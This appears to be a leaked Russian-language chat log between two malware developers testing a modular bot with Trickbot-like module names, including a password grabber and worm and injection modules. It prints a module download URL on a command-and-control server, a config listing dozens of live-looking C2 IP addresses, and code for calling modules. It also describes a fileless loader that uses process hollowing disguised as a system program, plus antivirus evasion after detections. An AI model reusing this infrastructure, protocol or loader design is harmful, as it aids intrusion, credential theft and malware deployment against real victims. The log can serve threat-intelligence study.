Timestamp	From	To	Message
2020-07-23 07:13:41.943786	van	hof	Привет!
1. Получил команду:
/62/tt0002/WIN-777_W1009200.504af0388dcc954d5c2b7b1bf73b0a81/fgts62mkaqe1Vz7s/103301474/
networkDll start
1234567890
2. Скачал модуль вот так:
https://92.63.105.67:447/tt0002/WIN-777_W1009200.504af0388dcc954d5c2b7b1bf73b0a81/5/networkDll64/
3. В нем конфиг:
<moduleconfig>
<nohead>yes</nohead>
<needinfo name="id"/>
<needinfo name="ip"/>
<autoconf>
<conf ctl="SetConf" file="dpost" period="1440"/>
</autoconf>
</moduleconfig>

4. Запускаю модуль. По логу, похоже, успешно запускаю.

5. Следующая команда:
/62/tt0002/WIN-777_W1009200.504af0388dcc954d5c2b7b1bf73b0a81/fgts62mkaqe1Vz7s/103313194/
injectDll sTart
1234567890
модуль не скачался, надо разбираться.

6. Были еще команды:
/62/tt0002/WIN-777_W1009200.504af0388dcc954d5c2b7b1bf73b0a81/fgts62mkaqe1Vz7s/103313218/
tabDll release
1234567890
/62/tt0002/WIN-777_W1009200.504af0388dcc954d5c2b7b1bf73b0a81/fgts62mkaqe1Vz7s/103313238/
nwormDll release
1234567890

/62/tt0002/WIN-777_W1009200.504af0388dcc954d5c2b7b1bf73b0a81/fgts62mkaqe1Vz7s/103313255/
mshareDll release
1234567890
этих модулей не было загружено, понятно.

7. Затем:
nwormDll infect
mshareDll infect
Эти модули тоже не загрузились. В логе что-то подробностей нет.

Можешь что-то об этой активности сказать, поглядев в админку?
Что-то хоть работает?
2020-07-23 07:13:51.933680	hof	van	привет
2020-07-23 07:14:45.843569	hof	van	сек
2020-07-23 07:22:41.991857	hof	van	в админку пришли данные от бота
mshareDll 	infect no module 	2020-07-23 06:50:33.34742
nwormDll 	infect no module 	2020-07-23 06:50:14.017471
injectDll 	sTart no module 	2020-07-23 06:49:04.230745
2020-07-23 07:23:09.791600	hof	van	это же бот отправил? что значит?
2020-07-23 07:24:07.350846	van	hof	по командам
injectDll sTart
nwormDll infect
mshareDll infect
все правильно по ТЗ: нет модулей в памяти - ничего не делаю - сообщаю и всё
2020-07-23 07:24:20.694848	hof	van	nwormDll infect
nWorm - название модуля
infect - это параметр к control
2020-07-23 07:25:08.453303	hof	van	при получении такой команды бот проверяет загружен ли такой модуль
2020-07-23 07:25:22.078009	van	hof	infect  не может быть аргументом control, так как этот аргумент в base64, мы же вчера обсудили
2020-07-23 07:25:30.880335	hof	van	если загружен, то вызывает Control с параметром infect
2020-07-23 07:26:00.560226	hof	van	если не загружен, то грузит модуль, вызывает Start и потом Control с параметром infect
2020-07-23 07:26:17.281126	hof	van	сейчас работает так
2020-07-23 07:26:30.123771	van	hof	да, ctl = infect, arg - нет. Ты прав.
2020-07-23 07:28:59.693187	van	hof	У меня в ТЗ:

8.3 При ctl не равном "release" и "start" возможны следующие ситуации:
•	Модуль не был запущен - в этом случае никаких действий не производится, отправляется отчёт на сервер через команду /14/
•	Модуль был запущен, но его процесса уже не существует - в этом случае никаких действий не производится, очищаются все структуры и данные связанные с модулем и считается, что не был запущен. Отправляется отчёт на сервер через команду /14/
•	Модуль был запущен, и его процесс существует - вызывается функция Control с сtl и переданными аргументами.
2020-07-23 07:29:31.996251	van	hof	вот поэтому я и не гружу модуль
2020-07-23 07:31:21.456515	hof	van	ок, тогда пока эти команды у тебя работать не будут
2020-07-23 07:31:27.452512	van	hof	а по запущенному модулю networkDll что-то видно?
2020-07-23 07:31:58.499409	hof	van	он события должен был отправить боту
2020-07-23 07:32:05.151466	hof	van	через callback
2020-07-23 07:32:22.675882	hof	van	принимал бот события?
2020-07-23 07:32:26.313293	van	hof	да я выгрузил все уже и ВМ выключил
2020-07-23 07:32:44.549531	van	hof	то есть он не успел ничего передать?
2020-07-23 07:33:33.221658	hof	van	в эту админку он передает только события, данные направляет в другую админку
2020-07-23 07:33:53.584471	hof	van	
<moduleconfig>
<nohead>yes</nohead>
<needinfo name="id"/>
<needinfo name="ip"/>
<autoconf>
<conf ctl="SetConf" file="dpost" period="1440"/>
</autoconf>
</moduleconfig>
2020-07-23 07:34:04.396074	hof	van	бот передал модулю файл dpost ?
2020-07-23 07:34:09.184709	van	hof	а ты можешь узнать что-то про него в другой админке?
2020-07-23 07:34:35.272466	van	hof	файл dpost?
2020-07-23 07:34:37.152175	hof	van	передал? просто в нем прокладки, на которые модуль должен отправить данные
2020-07-23 07:34:49.040068	van	hof	а-а-а, да
2020-07-23 07:34:55.293913	hof	van	<conf ctl="SetConf" file="dpost" period="1440"/>
2020-07-23 07:35:29.060165	van	hof	я ведь должен запросить файл и отдать модулю?
2020-07-23 07:35:36.928867	hof	van	да
2020-07-23 07:36:00.733227	hof	van	и передать в Start botid и ip
2020-07-23 07:36:08.127491	van	hof	полгода прошло, как писал это - позабывал всё
2020-07-23 07:36:22.332274	hof	van	да, конечно
2020-07-23 07:36:25.956249	van	hof	сейчас буду смотреть, спасибо
2020-07-23 07:36:36.706360	hof	van	нужно заново погружаться
2020-07-23 07:36:45.108293	van	hof	это точно
2020-07-23 07:37:25.619889	van	hof	сегодня буду всё вспоминать, пока не буду беспокоить по мелочам, извини
2020-07-23 09:30:23.119921	van	hof	У меня в боте основной конфиг старый, адреса дохлые почти все. Можно раздобыть свежий конфиг?
2020-07-23 09:30:50.608962	hof	van	да
2020-07-23 09:31:23.361362	hof	van	
<mcconf>
<ver>1000512</ver>
<gtag>tt0002</gtag>
<servs>
<srv>95.171.16.42:443</srv>
<srv>185.90.61.9:443</srv>
<srv>5.1.81.68:443</srv>
<srv>185.99.2.65:443</srv>
<srv>134.119.191.11:443</srv>
<srv>85.204.116.100:443</srv>
<srv>78.108.216.47:443</srv>
<srv>51.81.112.144:443</srv>
<srv>194.5.250.121:443</srv>
<srv>185.14.31.104:443</srv>
<srv>185.99.2.66:443</srv>
<srv>107.175.72.141:443</srv>
<srv>192.3.247.123:443</srv>
<srv>134.119.191.21:443</srv>
<srv>85.204.116.216:443</srv>
<srv>91.235.129.20:443</srv>
<srv>181.129.104.139:449</srv>
<srv>181.112.157.42:449</srv>
<srv>181.129.134.18:449</srv>
<srv>131.161.253.190:449</srv>
<srv>121.100.19.18:449</srv>
<srv>190.136.178.52:449</srv>
<srv>45.6.16.68:449</srv>
<srv>110.232.76.39:449</srv>
<srv>122.50.6.122:449</srv>
<srv>103.12.161.194:449</srv>
<srv>36.91.45.10:449</srv>
<srv>110.93.15.98:449</srv>
<srv>80.210.32.67:449</srv>
<srv>103.111.83.246:449</srv>
<srv>200.107.35.154:449</srv>
<srv>36.89.182.225:449</srv>
<srv>36.89.243.241:449</srv>
<srv>36.92.19.205:449</srv>
<srv>110.50.84.5:449</srv>
<srv>182.253.113.67:449</srv>
<srv>36.66.218.117:449</srv>
</servs>
<autorun>
<module name="pwgrab"/>
</autorun>
</mcconf>
2020-07-23 09:32:42.491792	van	hof	спасибо!
2020-07-23 10:38:39.622042	van	hof	Можешь помочь? Командой /5/ скачиваю модуль, используя адреса из расширенного конфига, кот. получаю по команде /0/. Скачиваю успешно. А вот файл dpost с каких адресов скачивать? По адресам  расширенного конфига не скачивается... В общем, в ТЗ толком не написано, как его получить.
2020-07-23 10:40:22.432945	van	hof	вот всё, что в ТЗ:
Атрибует "file" задаёт имя файла на сервере, файл запрашивается с помощью команды /5/.
2020-07-23 10:41:00.798389	van	hof	мне возвращается 404 - не туда лезу с запросом, похоже
2020-07-23 10:58:00.150365	hof	van	через 5
2020-07-23 10:58:10.652378	hof	van	сек, проверю точно
2020-07-23 11:04:01.413922	hof	van	да, через команду 5
2020-07-23 11:05:29.500896	hof	van	когда файл скачается, его нужно расшифровать, и передать в Control
2020-07-23 11:05:51.561293	hof	van	если указан атрибут ctl="SetConf"
2020-07-23 11:06:11.045035	hof	van	то передается с параметром "SetConf"
2020-07-23 11:07:31.818016	hof	van	
if (!this->Control(this->pvModuleHandle,
										 pszAnsiCtl,
										 pbConfig,
										 cbConfig,
										 resultInfo,
										 &pvOutData,
										 &dwOutSize,
										 outDataTag,
										 NULL)) {
2020-07-23 11:07:45.480668	hof	van	pszAnsiCtl -SetConf
2020-07-23 11:08:06.241089	hof	van	pbConfig - буфер с данными
2020-07-23 11:08:18.665461	hof	van	cbConfig - размер данных
2020-07-23 11:08:44.161085	hof	van	если ctl="SetConf" нет, то название файла и есть параметр
2020-07-23 11:08:55.721635	van	hof	да, через команду 5
2020-07-23 11:08:55.726187	van	hof	когда файл скачается, его нужно расшифровать, и передать в Control
2020-07-23 11:08:55.727082	van	hof	если указан атрибут ctl="SetConf"
2020-07-23 11:08:55.727791	van	hof	то передается с параметром "SetConf"
2020-07-23 11:08:55.728691	van	hof	
if (!this->Control(this->pvModuleHandle,
										 pszAnsiCtl,
										 pbConfig,
										 cbConfig,
										 resultInfo,
										 &pvOutData,
										 &dwOutSize,
										 outDataTag,
										 NULL)) {
2020-07-23 11:08:55.729417	van	hof	pszAnsiCtl -SetConf
2020-07-23 11:08:55.730122	van	hof	pbConfig - буфер с данными
2020-07-23 11:08:55.731136	van	hof	cbConfig - размер данных
2020-07-23 11:08:55.731836	van	hof	если ctl="SetConf" нет, то название файла и есть параметр
2020-07-23 11:10:48.039374	hof	van	13:57:59] <hof> через 5
[13:58:10] <hof> сек, проверю точно
[14:04:01] <hof> да, через команду 5
[14:05:29] <hof> когда файл скачается, его нужно расшифровать, и передать в Control
[14:05:51] <hof> если указан атрибут ctl="SetConf"
[14:06:10] <hof> то передается с параметром "SetConf"
[14:07:31] <hof> 
if (!this->Control(this->pvModuleHandle,
										 pszAnsiCtl,
										 pbConfig,
										 cbConfig,
										 resultInfo,
										 &pvOutData,
										 &dwOutSize,
										 outDataTag,
										 NULL)) {
[14:07:45] <hof> pszAnsiCtl -SetConf
[14:08:05] <hof> pbConfig - буфер с данными
[14:08:18] <hof> cbConfig - размер данных
[14:08:43] <hof> если ctl="SetConf" нет, то название файла и есть параметр
2020-07-23 11:11:04.792821	hof	van	прокладки основного командного сервера
2020-07-23 11:11:38.979089	hof	van	дошло сообщение?
2020-07-23 11:11:45.206399	van	hof	ага
2020-07-23 11:11:54.676964	van	hof	спасибо, попробую
2020-07-23 11:12:02.791728	hof	van	не за что
2020-07-29 08:04:24.800870	hof	van	привет
2020-07-29 08:04:53.048791	van	hof	Привет!
2020-07-29 08:05:19.303456	hof	van	буза пишет что нужна помощь с тестированием
2020-07-29 08:05:19.546743	hof	van	какие основные трудности?
2020-07-29 08:10:52.833408	hof	van	модули позапускал? приходят события?
2020-07-29 08:11:16.406312	hof	van	обновление конфига по 23 команде?
2020-07-29 08:11:53.649935	hof	van	проверить очень просто, поставь номер конфига более низкой версии
2020-07-29 08:12:17.133078	van	hof	Пока тестирую сам. Запускал пока только модуль networkDll. По-моему, все отрабатывает нормально. Ты давал список модулей, попробую еще их. Если явных ошибок не будет, то надо бы тебе бот проверить, опытный глаз нужен. На выходные хочу бот запустить на пару суток покрутиться, может еще что вылезет.
По ТЗ бот нерезидентный и к нему нужен лоадер. Лоадер я писал раньше для бэкдора. Есть ТЗ на лоадер для модульного бота?
События приходят, 23 - конфиг обновлялся раньше, а теперь при новой версии - нет ))) Всё в порядке.
2020-07-29 08:12:24.255232	hof	van	бот должен обновить конфиг, скачать новую версию, сохранить ее
2020-07-29 08:13:50.847196	hof	van	всмысле бот не прописывается в системе?
2020-07-29 08:13:58.677154	van	hof	нет
2020-07-29 08:14:45.670043	hof	van	т.е. лоадер должен запустить бота в памяти? без записи на диск? так планировалось?
2020-07-29 08:15:10.609157	van	hof	да. Закрепляется в системе лоадер.
2020-07-29 08:15:36.823652	hof	van	ок, нормально
2020-07-29 08:15:51.410728	hof	van	бот сделан в виде шелкода?
2020-07-29 08:16:06.041020	hof	van	версии 32 и 64 бита?
2020-07-29 08:16:13.479528	van	hof	нет, обычный exe 32 и 64
2020-07-29 08:16:31.353633	hof	van	т.е. лоадеру придется настраивать образ в памяти?
2020-07-29 08:17:10.114505	van	hof	да, лоадер запустит скаченный бот методом холловинг
2020-07-29 08:17:31.216650	van	hof	мод маскарадом системной проги
2020-07-29 08:17:53.947501	hof	van	ок, если в тз так было, то нет проблем
2020-07-29 08:18:16.293618	hof	van	тогда мне кажется основное - проверить запуск и выгрузку модулей
2020-07-29 08:18:27.664453	van	hof	совершенно верно
2020-07-29 08:18:37.909048	van	hof	лоадер - второй этап
2020-07-29 08:18:50.976073	hof	van	обновление конфига, команды запуска exe, dll, pws, js
2020-07-29 08:19:08.064610	hof	van	ьбыли такие по тз?
2020-07-29 08:19:24.149495	van	hof	нет, только dll - модули
2020-07-29 08:20:34.683906	hof	van	тогда думаю нужен простейший лоадер(тестовый exe, может не качать, а содержать тело бота в себе), который запускает бот в памяти
2020-07-29 08:21:04.883931	hof	van	отдадим тестеру, пусть запускает на тестовых вм
2020-07-29 08:21:31.650397	van	hof	да пока просто запускать бот и всё
2020-07-29 08:21:48.196173	hof	van	нет, это уже не то
2020-07-29 08:22:16.015982	hof	van	нужно запускать тем же методом, которым будет запускать лоадер
2020-07-29 08:22:29.856582	van	hof	бот должен заливаться в админку, лоадер скачивать его. Этот механизм в админке есть?
2020-07-29 08:22:58.516787	van	hof	Мы это уже полгода используем в админке лоадер-бэкдор.
2020-07-29 08:23:18.888514	hof	van	в админке чего?
2020-07-29 08:23:26.369603	hof	van	в админке бота?
2020-07-29 08:23:30.195248	van	hof	да
2020-07-29 08:23:45.680119	hof	van	мне кажется это должно быть в админке лоадера
2020-07-29 08:23:58.716260	van	hof	есть такая админка?
2020-07-29 08:24:07.196923	hof	van	у меня нет
2020-07-29 08:24:20.864481	hof	van	но если уже полгода работает, значит у кого то есть
2020-07-29 08:24:43.691111	van	hof	да там-то я всё знаю )))
2020-07-29 08:24:45.855512	hof	van	какая разница лоадеру, скачать и запустить бэкдор или бот?
2020-07-29 08:24:57.978295	van	hof	да я тоже так думаю )))
2020-07-29 08:25:13.956954	hof	van	так в чем тогда проблема?
2020-07-29 08:25:44.762254	van	hof	только в проверке функционала моего бота опытным человеком.
2020-07-29 08:26:03.661637	van	hof	и ткнуть меня носом в ошибки
2020-07-29 08:26:36.536486	hof	van	так опытный человек и говорит как бы он сделал, предлагает протестировать как нужно
2020-07-29 08:26:43.919242	van	hof	ок
2020-07-29 08:27:13.321603	hof	van	не обязательно связываться с админками, можно запустить бот из тела лоадера
2020-07-29 08:27:25.355363	hof	van	нам же чисто для теста
2020-07-29 08:27:31.320576	van	hof	ну, да
2020-07-29 08:27:37.734311	hof	van	но бот запустится в реальных условиях
2020-07-29 08:27:43.337953	van	hof	ага
2020-07-29 08:28:13.351365	van	hof	еще бы знать, что это бот, а не куча ошибок
2020-07-29 08:28:57.818489	hof	van	я в таких случаях делаю собираю дебаг версию бота, вывод вывожу в debugview
2020-07-29 08:29:19.160541	van	hof	поэтому на первом этапе запустить бот на ВМ вручную, отстучит в админку, скармливать ему модули и смотреть
2020-07-29 08:29:21.148719	hof	van	запускаю, и проверяю все основные команды
2020-07-29 08:29:47.786163	van	hof	так и сделаем
2020-07-29 08:30:03.484261	hof	van	да нет проблем, только потом придется еще раз тестировать, но уже при запуске в памяти
2020-07-29 08:30:17.185377	van	hof	это - да
2020-07-29 08:30:30.113785	hof	van	так почему сразу это не сделать?
2020-07-29 08:31:54.396770	van	hof	тогда надо полноценно загружать лоадером бот из админки, чтобы уж совсем второй раз не тестировать... )))
2020-07-29 08:32:46.671375	hof	van	тут уже больше на тест лоадера будет похоже
2020-07-29 08:32:58.067332	hof	van	скачает он тело бота или нет )
2020-07-29 08:33:29.780164	hof	van	я не настаиваю, дружище, как попросишь так и сделаем
2020-07-29 08:34:07.059022	hof	van	делюсь опытом:
пишу бот в такой манере, после каждой API

this->hRequest = WinHttpOpenRequest(
										 this->hConnect,
										 strbuf,
										 pszURI,
										 NULL,
										 WINHTTP_NO_REFERER,
										 WINHTTP_DEFAULT_ACCEPT_TYPES,
										 this->bSecure ? WINHTTP_FLAG_SECURE : 0);
	if (!hRequest) {
		LOG(stdout, "SendGet WinHttpOpenRequest error %ld\n", GetLastError());
		goto CleanUp;
	}
2020-07-29 08:34:29.216811	hof	van	при неправильной отработке вывожу в лог ошибку
2020-07-29 08:34:50.501532	van	hof	да я так же делаю
2020-07-29 08:35:00.913915	hof	van	вот, отлично
2020-07-29 08:35:36.521438	hof	van	вот нужно собрать такой бот, именно с логом, не важно куда - в файл, в консоль, в дебагвью
2020-07-29 08:35:49.682286	hof	van	и проверить на разных ос
2020-07-29 08:36:04.427741	hof	van	но желательно сразу запускать его в памяти
2020-07-29 08:36:26.796159	hof	van	некоторые апи при запуске в памяти работают не так, как при обычном запуске
2020-07-29 08:36:36.972226	hof	van	вот и проверить все один раз
2020-07-29 08:39:25.165841	van	hof	я уже в переписке с Бузой про админку лоадера
2020-09-02 13:18:05.621187	hof	van	привет
2020-09-02 13:18:20.867954	hof	van	может у тебя бот готов?
2020-09-02 13:18:26.414654	van	hof	Привет!
2020-09-02 13:19:17.548690	hof	van	у меня спалился сильно, и нод и дефендер
2020-09-02 13:19:27.106319	van	hof	Я не уверен, Дор тестил, вроде не все в порядке.
2020-09-02 13:19:54.210975	hof	van	ок
2020-09-02 13:20:15.867051	van	hof	Я свой бот еще не чистил, пока функционал только проверяем. Под АВ не пробовал.
2020-09-02 13:20:47.287924	hof	van	да врядли он свежий будет палиться
2020-09-02 13:21:11.482239	van	hof	Да у меня с другим проектом тоже палево пошло, чищу лоадер сейчас - волосы дыбом...
2020-09-02 13:21:51.389881	hof	van	да, иногда напрягает
